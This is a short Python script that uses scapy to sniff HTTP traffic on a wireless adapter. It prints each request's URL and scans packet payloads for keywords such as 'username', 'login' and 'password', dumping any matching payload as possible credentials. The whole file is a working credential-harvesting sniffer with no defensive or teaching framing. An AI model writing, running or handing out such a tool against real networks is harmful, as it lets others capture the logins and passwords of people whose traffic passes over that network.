import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

def process_packet(packet):
    if http.HTTPRequest in packet:
        url = get_url(packet)
        print("HTTP Url is: {}".format(url))
        cred = get_credentials(packet)
        if cred:
            print("Possible credentials information: {}".format(cred))

keywords = ('username', 'user', 'uname', 'login', 'password', 'pass', 'signin', 'signup', 'name')

def get_credentials(packet):
    if scapy.Raw in packet:
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load

sniff('TP-Link Wireless USB Adapter')
